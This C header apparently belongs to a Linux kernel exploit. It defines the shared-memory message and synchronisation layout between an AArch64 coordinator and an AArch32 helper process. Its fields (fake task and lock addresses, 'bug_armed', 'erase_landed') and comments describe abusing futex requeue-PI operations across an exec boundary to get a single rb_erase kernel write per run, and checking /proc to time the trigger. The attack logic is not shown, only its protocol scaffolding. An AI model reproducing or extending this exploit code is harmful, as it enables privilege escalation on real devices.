#ifndef TCL_V643_MCAST_HELPER_PROTOCOL_H
#define TCL_V643_MCAST_HELPER_PROTOCOL_H

#include <stddef.h>
#include <stdatomic.h>
#include <stdint.h>

#define TCL_V643_MCAST_HELPER_MAGIC UINT32_C(0x544d4348) /* TMCH */
#define TCL_V643_MCAST_HELPER_VERSION UINT32_C(5)
#define TCL_V643_HELPER_CARRIER_NEWSELECT UINT32_C(1)

/* Fixed-width prefix shared by the self-test and the live split-ABI object.
 * Kernel addresses are deliberately uint64_t: uintptr_t would truncate them
 * in the AArch32 helper. */
struct tcl_v643_mcast_helper_message {
  uint32_t magic;
  uint32_t version;
  uint32_t size;
  uint32_t flags;
  uint64_t fake_task;
  uint64_t fake_lock;
  uint32_t wake_state;
  int32_t prio;
};

_Static_assert(sizeof(struct tcl_v643_mcast_helper_message) == 40,
               "MCAST helper protocol layout changed");

/* One MAP_SHARED object is inherited by the AArch32 helper.  The futex words
 * must live here (not in the AArch64 coordinator's private globals), because
 * FUTEX_WAIT_REQUEUE_PI and FUTEX_CMP_REQUEUE_PI have to operate on the exact
 * same keys across the exec boundary.  All cross-ABI fields are fixed width.
 * A protocol run represents ONE rb_erase only; a second write requires a
 * fresh helper and a fresh vulnerable futex cycle. */
struct tcl_v643_mcast_shared {
  struct tcl_v643_mcast_helper_message message; /* 0x00..0x27 */
  uint32_t f_wait;                              /* 0x28 */
  uint32_t f_target;                            /* 0x2c */
  uint32_t f_chain;                             /* 0x30 */
  /* Published only by the AArch32 process leader after /proc proves that
   * helper_tid is stably sleeping in FUTEX_WAIT_REQUEUE_PI on f_wait.  A
   * source-level waiter_waiting flag is not sufficient: it is set before the
   * syscall and left a scheduling race in the same-page reuse route. */
  _Atomic uint32_t waiter_observed;             /* 0x34 */
  _Atomic uint32_t helper_ready;                /* 0x38 */
  _Atomic uint32_t waiter_ready;                /* 0x3c */
  _Atomic uint32_t waiter_waiting;              /* 0x40 */
  _Atomic uint32_t owner_started;               /* 0x44 */
  _Atomic uint32_t bug_armed;                   /* 0x48 */
  _Atomic uint32_t handler_done;                /* 0x4c */
  _Atomic uint32_t round_go;                    /* 0x50 */
  _Atomic uint32_t round_done;                  /* 0x54 */
  _Atomic uint32_t cleanup_done;                /* 0x58 */
  _Atomic uint32_t failures;                    /* 0x5c */
  _Atomic uint32_t helper_tid;                  /* 0x60 */
  _Atomic uint32_t helper_uid;                  /* 0x64 */
  _Atomic uint32_t erase_landed;                /* 0x68 */
  int32_t diag_carrier_ret;                     /* 0x6c */
  int32_t diag_carrier_errno;                   /* 0x70 */
  int32_t diag_wait_ret;                        /* 0x74 */
  int32_t diag_wait_errno;                      /* 0x78 */
  int32_t diag_disarm_errno;                    /* 0x7c */
  _Atomic uint32_t owner_tid;                   /* 0x80 */
  _Atomic uint32_t owner_abort_done;            /* 0x84 */
  int32_t diag_owner_ret;                       /* 0x88 */
  int32_t diag_owner_errno;                     /* 0x8c */
  /* Published by the helper leader only after /proc observes the waiter
   * stably blocked in compat _newselect.  This is the persistent-carrier
   * handoff that the old post-MCAST userspace flag could not prove. */
  _Atomic uint32_t carrier_observed;            /* 0x90 */
};

_Static_assert(offsetof(struct tcl_v643_mcast_shared, f_wait) == 40,
               "MCAST shared futex ABI changed");
_Static_assert(offsetof(struct tcl_v643_mcast_shared, waiter_observed) == 52,
               "MCAST waiter-observer ABI changed");
_Static_assert(offsetof(struct tcl_v643_mcast_shared, helper_ready) == 56,
               "MCAST shared atomic ABI changed");
_Static_assert(offsetof(struct tcl_v643_mcast_shared, owner_tid) == 128,
               "MCAST owner-abort diagnostic ABI changed");
_Static_assert(offsetof(struct tcl_v643_mcast_shared, carrier_observed) == 144,
               "_newselect carrier witness ABI changed");
_Static_assert(sizeof(struct tcl_v643_mcast_shared) == 152,
               "split helper shared object must remain 152 bytes");

#endif
